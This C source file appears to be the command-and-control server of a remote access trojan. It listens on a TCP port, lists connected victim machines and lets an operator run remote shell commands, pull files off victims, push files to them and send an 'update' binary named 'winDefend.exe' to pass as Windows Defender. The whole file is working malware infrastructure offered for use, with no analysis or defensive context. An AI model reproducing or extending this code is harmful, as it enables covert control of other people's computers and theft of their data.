#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#include "eaSCKTBasicComProtocols.h"

#define PORT 38709

#define PROGRAM_NAME "winDefend.exe"

static fd_set clients;

#ifndef _WIN32
static EAScktType big_val;
#endif

static void commWithSystems(void);
static void *threadHI(void *param);
static bool process(EAScktType sckt);
static bool recvSendText(EAScktType sckt);

int main()
{
    if (eaSCKTInit())
    {
        return EXIT_FAILURE;
    }

    commWithSystems();

    eaSCKTFinish();

    return 0;
}

static void commWithSystems(void)
{
    // Create TCP Socket

    EAScktType server = socket(AF_INET, SOCK_STREAM, 0);

    if (SCKT_ERR == server)
    {
        perror("socket");

        return;
    }

    // Fill "sockaddr_in" struct

    struct sockaddr_in myInfos = {
        .sin_family = AF_INET,
        .sin_port = htons(PORT),
        .sin_addr.s_addr = INADDR_ANY,
    };

    // Bind socket

    if (0 != bind(server, 
                         (struct sockaddr *)&myInfos, 
                         sizeof(struct sockaddr)))
    {
        perror("bind");
        eaSCKTClose(server);

        return;
    }

    // Listen config

    if (0 != listen(server, 10))
    {
        perror("listen");
        eaSCKTClose(server);

        return;
    }

    // Create Thread Clients For Human/Hacker Interface :D
    pthread_t th;

    (void)pthread_create(&th, NULL, threadHI, NULL);
    (void)pthread_detach(th);

	FD_ZERO(&clients);

    // For Clients

    for(;;)
    {
        struct sockaddr_in clientInfos;

        EAScktType newClient = accept(server, 
                                      (struct sockaddr *)&clientInfos, 
                                      &((int){sizeof(clientInfos)}));

        if (SCKT_ERR == newClient)
        {
            break;
        }

	    FD_SET(newClient, &clients);

#ifndef _WIN32
        if (big_val < newClient)
        {
            big_val = newClient;
        }
#endif
    }

    eaSCKTClose(server);
}

static void *threadHI(void *param)
{
    (void)param;

    for (;;)
    {
        SLEEP(1000);

        puts("Enter Client ID for connection or 0 for refresh\n\n");

#ifndef _WIN32
        for (EAScktType client = 1; client <= big_val; client++)
        if (FD_ISSET(client, &clients))
        {
#else
        for (unsigned int idx = 0U; idx < clients.fd_count; idx++)
        {
            EAScktType client = clients.fd_array[idx];
#endif
            struct sockaddr_in clientInfos = {0};

            getpeername(client, 
                        (struct  sockaddr *)&clientInfos, 
                        &((int){sizeof(struct  sockaddr)}));
            
            if (inet_ntoa(clientInfos.sin_addr)[0] != '0')
            {
                printf("Client ID : %u ", (unsigned int)client);
                printf("Client IP %s\n", inet_ntoa(clientInfos.sin_addr));
            }
        }

        unsigned int inp;

        (void)scanf("%u", &inp);
        fflush(stdin);

        if ((!inp) || !FD_ISSET((EAScktType)inp, &clients))
        {
            continue;
        }

        bool ret = process((EAScktType)inp);

        if (false == ret)
        {
            FD_CLR((EAScktType)inp, &clients);
        }

        CLEAR_TERMINAL();
    }

    return NULL;
}

static bool process(EAScktType sckt)
{
    bool connection = true;
    char text[313 + 1] = {0};

    for (;;)
    {
        CLEAR_TERMINAL();

        puts("Command List");
        puts("\t-> cmd");
        puts("\t-> getFile <Path>");
        puts("\t-> sendFile <Path>");
        puts("\t-> update\n");

        scanf("%313[^\n]", text);
        fflush(stdin);

        if (!strncmp(text, "exit", 4U))
        {
            break;
        }

        if (false == senderText(sckt, text))
        {
            connection = false;

            break;
        }

        if (!strncmp(text, "cmd", 3U))
        {
            if (false == recvSendText(sckt))
            {
                connection = false;

                break;
            }
        }
        else if (!strncmp(text, "getFile ", 8U))
        {
            if (false == recverFile(sckt))
            {
                connection = false;

                break;
            }
        }
        else if (!strncmp(text, "sendFile ", 9U))
        {
            if (false == senderFile(sckt, &text[9]))
            {
                connection = false;

                break;
            }
        }
        else if (!strncmp(text, "update", 6U))
        {
            connection = false;

            (void)senderFile(sckt, PROGRAM_NAME);
            
            break;
        }
    }

    return connection;
}

static bool recvSendText(EAScktType sckt)
{
    char ioStream[4500 + 1];
    bool connection = true;

    for (;;)
    {
        if (false == recverText(sckt, ioStream, sizeof(ioStream)))
        {
            connection = false;

            break;
        }

        if (!strncmp(ioStream, "_Error_", 7U))
        {
            printf("Error :%s\n", &ioStream[7]);

            connection = false;

            break;
        }

        (void)printf(ioStream);
        (void)fgets(ioStream, 4500, stdin);

        if (false == senderText(sckt, ioStream))
        {
            connection = false;

            break;
        }

        if (!strcmp(ioStream, "exit\n"))
        {
            break;
        }
    }

    return connection;
}
